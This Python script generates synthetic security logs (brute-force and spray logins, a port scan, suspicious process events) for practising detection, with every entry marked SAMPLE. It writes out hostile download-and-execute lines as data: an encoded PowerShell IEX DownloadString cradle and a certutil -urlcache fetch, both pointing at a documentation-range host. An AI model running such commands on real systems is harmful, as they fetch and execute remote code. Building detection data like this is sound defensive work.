"""Reproducible synthetic logs (seed 42).

External addresses use documentation ranges (192.0.2.0/24, 198.51.100.0/24,
203.0.113.0/24); internal hosts use RFC1918 space. This is SAMPLE DATA only.

For extra realism, replace/extend with: Sysmon + Atomic Red Team on a home lab,
or EVTX-ATTACK-SAMPLES converted to CSV.
"""
import base64
import csv
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(42)
OUT = Path(__file__).resolve().parent / "generated"
OUT.mkdir(exist_ok=True)
T0 = datetime.now(timezone.utc).replace(minute=0, second=0, microsecond=0)


def ts(min_off, sec_off=0):
    return (T0 + timedelta(minutes=min_off, seconds=sec_off)).strftime("%Y-%m-%d %H:%M:%S")


# windows.csv - normal login, brute force, spray, success-after-failures, chain
with open(OUT / "windows.csv", "w", newline="") as f:
    wcsv = csv.writer(f)
    wcsv.writerow(["EventID", "TimeCreated", "TargetUserName", "IpAddress",
                   "WorkstationName", "LogonType", "Message"])
    wcsv.writerow([4624, ts(0), "jsmith", "10.1.5.20", "WS-114", 2, "SAMPLE normal login"])
    for i in range(8):
        wcsv.writerow([4625, ts(1, i * 20), "administrator", "203.0.113.99",
                       "WS-07", 3, "SAMPLE failed login"])
    wcsv.writerow([4624, ts(2), "administrator", "203.0.113.99", "WS-07", 3,
                   "SAMPLE success after failures"])
    for i, u in enumerate(["a.adams", "b.brown", "c.clark", "d.davis", "e.evans", "f.fox"]):
        wcsv.writerow([4625, ts(3, i * 15), u, "198.51.100.23", "WS-12", 3, "SAMPLE spray"])
    wcsv.writerow([4624, ts(4), "a.adams", "198.51.100.23", "WS-12", 3, "SAMPLE spray success"])
    wcsv.writerow([4720, ts(5), "svc_update", "", "WS-12", 0, "SAMPLE account creation"])
    wcsv.writerow([4698, ts(6), "SYSTEM", "", "WS-12", 0, "SAMPLE scheduled task created"])
    wcsv.writerow([1102, ts(7), "SYSTEM", "", "WS-12", 0, "SAMPLE audit log cleared"])

# powershell.log - suspicious + encoded command (decodable)
enc = base64.b64encode(
    "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/a.ps1')".encode("utf-16-le")
).decode()
with open(OUT / "powershell.log", "w") as f:
    f.write(f"{ts(8)},4104,WS-30,SAMPLE powershell -nop -w hidden -enc {enc}\n")
    f.write(f"{ts(9)},4104,WS-31,SAMPLE Get-ChildItem C:\\Users (benign look-alike)\n")

# firewall.csv - port scan
with open(OUT / "firewall.csv", "w", newline="") as f:
    fw = csv.writer(f)
    fw.writerow(["timestamp", "src_ip", "dst_ip", "dst_port", "action"])
    for p in range(30):
        fw.writerow([ts(10, p * 3), "198.51.100.50", f"10.1.20.{10 + p % 5}", 1 + p * 200, "deny"])

# sysmon.csv - LOLBin + suspicious parent/child + benign look-alike
with open(OUT / "sysmon.csv", "w", newline="") as f:
    sm = csv.writer(f)
    sm.writerow(["EventID", "timestamp", "Image", "CommandLine", "ParentImage", "User", "Hostname"])
    sm.writerow([1, ts(11), "C:\\Windows\\System32\\certutil.exe",
                 "certutil -urlcache -split -f http://192.0.2.44/x.dll",
                 "C:\\Windows\\System32\\cmd.exe", "jsmith", "WS-40"])
    sm.writerow([1, ts(12), "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami",
                 "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                 "jsmith", "WS-41"])
    sm.writerow([1, ts(13), "C:\\Windows\\System32\\notepad.exe", "notepad.exe notes.txt",
                 "C:\\Windows\\explorer.exe", "jsmith", "WS-41"])

# auth.log + apache.log - benign look-alikes and noise
base_ts = T0.strftime("%b %d %H:%M:%S")
with open(OUT / "auth.log", "w") as f:
    f.write(f"{base_ts} srv01 sshd[101]: Accepted password for deploy from 10.1.9.5 port 51234 ssh2\n")
    f.write(f"{base_ts} srv01 sshd[102]: Failed password for admin from 192.0.2.44 port 60001 ssh2\n")
with open(OUT / "apache.log", "w") as f:
    ap = T0.strftime("%d/%b/%Y:%H:%M:%S")
    f.write(f'10.1.5.30 - - [{ap} +0000] "GET /index.html HTTP/1.1" 200 1234\n')
    f.write(f'192.0.2.44 - - [{ap} +0000] "GET /wp-admin/login.php HTTP/1.1" 404 208\n')

print(f"SAMPLE DATA written to {OUT}")
